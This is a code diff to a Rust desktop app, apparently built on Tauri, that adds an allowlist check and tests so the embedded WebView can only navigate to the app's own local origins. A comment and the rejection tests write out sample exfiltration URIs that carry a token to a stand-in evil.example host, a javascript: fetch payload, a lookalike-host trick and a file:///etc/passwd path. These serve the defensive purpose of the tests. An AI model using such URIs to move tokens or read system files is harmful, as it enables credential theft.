@@ -313,6 +313,35 @@ pub fn preflight(allow_unsandboxed_webview: bool) -> Result<(), String> {
     Ok(())
 }
 
+/// Whether the WebView may navigate to `uri`.
+///
+/// The CSP keeps the web realm from *fetching* anything remote, but no CSP
+/// directive governs top-level navigation: `location.href = 'https://evil/?' +
+/// token` would still leave, carrying whatever it likes in the URL. This is the
+/// matching gate — only the app's own origins are navigable, so the WebView
+/// cannot reach the internet by any route.
+///
+/// `about:blank` and the Tauri/asset custom protocols are the app's own; a
+/// URI we cannot make sense of is refused (fail closed).
+pub fn is_local_navigation(uri: &str) -> bool {
+    let uri = uri.trim();
+    if uri.is_empty() {
+        return false;
+    }
+    const LOCAL_PREFIXES: &[&str] = &[
+        "about:blank",
+        "tauri://",
+        "asset://",
+        "ipc://",
+        "http://tauri.localhost",
+        "http://ipc.localhost",
+        "http://asset.localhost",
+        "http://127.0.0.1:",
+        "http://localhost:",
+    ];
+    LOCAL_PREFIXES.iter().any(|prefix| uri.starts_with(prefix))
+}
+
 /// Whether WebKit's web process — the one that decodes the images and video a
 /// panel displays — is really confined.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -501,6 +530,39 @@ mod tests {
     #[test]
     fn test_preflight_passes_with_a_working_sandbox_and_a_clean_environment() {
         assert!(preflight_result(None, Ok(())).is_ok());
+    }
+
+    // --- Navigation: the WebView must never leave the app's own origins.
+
+    #[test]
+    fn test_the_apps_own_origins_are_navigable() {
+        for uri in [
+            "http://tauri.localhost/",
+            "http://127.0.0.1:7524/panel/file/index.html",
+            "http://localhost:7524/fsraw?path=/a/b.png",
+            "about:blank",
+            "tauri://localhost",
+        ] {
+            assert!(is_local_navigation(uri), "must stay navigable: {uri}");
+        }
+    }
+
+    #[test]
+    fn test_no_remote_navigation() {
+        for uri in [
+            "https://evil.example/?token=abcdef",
+            "http://evil.example/",
+            // No CSP directive governs navigation, so this is the exfiltration
+            // route the policy gate exists to close.
+            "http://127.0.0.1.evil.example/",
+            "https://127.0.0.1/",
+            "ftp://evil.example/",
+            "javascript:fetch('https://evil.example')",
+            "file:///etc/passwd",
+            "",
+        ] {
+            assert!(!is_local_navigation(uri), "must be refused: {uri:?}");
+        }
     }
 
     // --- The WebKit web-process check.
